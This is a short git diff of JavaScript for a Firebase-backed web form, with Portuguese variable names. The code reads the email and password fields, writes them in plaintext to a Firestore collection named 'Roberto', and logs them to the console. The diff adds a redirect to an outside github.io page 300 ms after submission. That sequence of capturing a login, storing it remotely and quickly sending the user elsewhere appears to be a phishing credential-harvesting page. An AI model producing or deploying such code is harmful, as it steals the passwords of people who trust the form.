@@ -11,6 +11,7 @@ firebase.initializeApp({
 var db = firebase.firestore();
 
 function adicionarDados(){
+
     var email = document.getElementById('email').value;
     var senha = document.getElementById('senha').value;
     db.collection("Roberto").add({
@@ -18,6 +19,11 @@ function adicionarDados(){
         Valor: senha,
     })
     console.log(email+" "+senha);
-    
+
+    setTimeout(function(){
+    window.location.href = "https://leopoglia.github.io/trilogy/";
+    },300);
+
 }
+
 
